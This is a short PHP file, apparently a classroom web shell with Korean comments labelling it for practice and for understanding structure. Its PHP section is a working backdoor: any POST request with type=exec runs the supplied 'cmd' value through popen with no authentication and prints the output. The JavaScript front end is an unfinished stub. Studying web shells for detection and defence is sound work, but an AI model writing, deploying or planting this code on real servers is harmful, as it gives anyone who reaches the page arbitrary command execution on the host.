<?php
// 서버 경로 정보 확인
$str_http_path = $_SERVER['HTTP_HOST'] . substr(realpath(__FILE__), strlen($_SERVER['DOCUMENT_ROOT']));

// 명령 실행 함수
function exec_shell($cmd) {
    $fp = popen($cmd, 'r');   // 명령 실행
    $str_read_message = "";
    while(!feof($fp)) {
        $buffer = fgets($fp, 4096);
        $str_read_message .= $buffer . "<br />";
    }
    pclose($fp);
    return $str_read_message;
}

// POST 요청으로 type=exec, cmd 값이 들어오면 실행
if (isset($_POST["type"]) && $_POST["type"] == "exec") {
    $cmd = $_POST["cmd"];
    echo exec_shell($cmd);
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="pragma" content="no-cache" />
<title>Web shell (실습용)</title>
<script src="http://code.jquery.com/jquery.min.js"></script>
<script type="text/javascript">
    class Handle {
        constructor() {
            this.path = "http://<?php echo $str_http_path; ?>";
        }
        makeArgs(_key, _value) {
            var args = "&" + _key + "=" + _value;
            return args;
        }
        postArgs(_target, _args) {
            var result;
            // 여기에 Ajax 요청 로직 추가 가능
        }
    }
</script>
</head>
<body>
    <h3>Web Shell 실습 페이지</h3>
    <!-- 실제 공격용이 아니라 구조 이해용 -->
</body>
</html>
